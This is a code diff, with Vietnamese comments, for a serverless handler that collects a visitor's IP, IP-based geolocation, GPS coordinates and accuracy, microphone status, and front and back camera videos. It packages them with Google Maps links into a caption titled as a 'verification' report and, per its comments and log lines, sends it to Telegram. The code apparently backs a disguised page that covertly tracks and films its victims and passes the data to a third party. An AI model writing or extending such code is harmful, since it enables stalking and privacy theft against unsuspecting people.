@@ -8,35 +8,73 @@ export default async function handler(req) {
     return new Response("Method Not Allowed", { status: 405 });
 
   try {
+    // 1. LẤY IP TỪ HEADER
     const userIP =
-      req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
+      req.headers.get("x-forwarded-for")?.split(",")[0] || 
+      req.headers.get("cf-connecting-ip") ||
+      req.headers.get("x-real-ip") ||
+      "Unknown";
     
     let geo = {};
+    let ipLat = 0;
+    let ipLon = 0;
+    
     try {
+      // Lấy vị trí từ IP
       const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
       geo = await geoRes.json();
+      ipLat = geo.latitude || 0;
+      ipLon = geo.longitude || 0;
     } catch (e) {
       geo = {};
     }
 
-    const lat = geo.latitude || "0";
-    const lon = geo.longitude || "0";
-    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
-
+    // 2. NHẬN DỮ LIỆU TỪ CLIENT
     const contentType = req.headers.get("content-type") || "";
     let clientData = {};
     let formData = null;
+    let gpsLat = 0;
+    let gpsLon = 0;
 
     if (contentType.includes("multipart/form-data")) {
       formData = await req.formData();
       clientData = JSON.parse(formData.get("clientInfo") || "{}");
+      gpsLat = parseFloat(clientData.lat) || 0;
+      gpsLon = parseFloat(clientData.lon) || 0;
     } else {
       clientData = await req.json();
+      gpsLat = parseFloat(clientData.lat) || 0;
+      gpsLon = parseFloat(clientData.lon) || 0;
     }
 
     const hasFront = formData && formData.has("front");
     const hasBack = formData && formData.has("back");
 
+    // 3. QUYẾT ĐỊNH DÙNG TỌA ĐỘ NÀO (ƯU TIÊN GPS)
+    const finalLat = gpsLat !== 0 ? gpsLat : ipLat;
+    const finalLon = gpsLon !== 0 ? gpsLon : ipLon;
+    const lat = finalLat || 0;
+    const lon = finalLon || 0;
+    
+    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
+
+    // 4. TẠO LINK GOOGLE MAPS CHUẨN
+    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    const googleMapsEmbed = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d${lon}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1svi!2s!4v${Date.now()}`;
+    const googleMapsShort = `https://maps.google.com/?q=${lat},${lon}`;
+    
+    // Link Google Maps với tên địa điểm (nếu có)
+    let locationName = '';
+    if (geo.cityName && geo.countryName) {
+      locationName = `${geo.cityName}, ${geo.countryName}`;
+    } else if (geo.regionName) {
+      locationName = geo.regionName;
+    }
+    const mapsWithPlace = locationName ? 
+      `https://www.google.com/maps/place/${encodeURIComponent(locationName)}/@${lat},${lon},15z` :
+      `https://www.google.com/maps?q=${lat},${lon}`;
+
+    // 5. TẠO CAPTION
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
 
@@ -46,15 +84,31 @@ export default async function handler(req) {
 🌍 IP dân cư: ${userIP}
 🏢 ISP: ${geo.asName || "VNNIC"}
 🏙️ Địa chỉ: ${address}
-🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
-📍 Vĩ độ: ${lat}
-📍 Kinh độ: ${lon}
-🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
+
+📍 Vĩ độ (GPS): ${gpsLat !== 0 ? gpsLat : 'Không có'}
+📍 Kinh độ (GPS): ${gpsLon !== 0 ? gpsLon : 'Không có'}
+📍 Vĩ độ (IP): ${ipLat || 0}
+📍 Kinh độ (IP): ${ipLon || 0}
+📍 Vĩ độ (Sử dụng): ${lat}
+📍 Kinh độ (Sử dụng): ${lon}
+🎯 Độ chính xác GPS: ${clientData.accuracy || 'Không có'}m
+
+🗺️ Google Maps: ${mapsWithPlace}
+📍 Google Maps (Q): ${googleMapsLink}
+📍 Google Maps (Short): ${googleMapsShort}
+📌 Google Maps Embed: ${googleMapsEmbed}
+
+🎙️ Microphone: ${clientData.microphone || '❌ Không có quyền'}
 🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
 `.trim();
 
+    console.log('📤 Bắt đầu gửi lên Telegram...');
+    console.log(`📍 Tọa độ sử dụng: ${lat}, ${lon}`);
+    console.log(`🗺️ Link Google Maps: ${mapsWithPlace}`);
+
+    // 6. GỬI LÊN TELEGRAM
     if (hasFront || hasBack) {
       // Gửi video trước
       if (hasFront) {
@@ -111,6 +165,7 @@ export default async function handler(req) {
       return new Response(await res.text(), { status: 200 });
     }
   } catch (err) {
+    console.error('❌ Lỗi:', err);
     return new Response(JSON.stringify({ error: err.message }), {
       status: 500,
     });
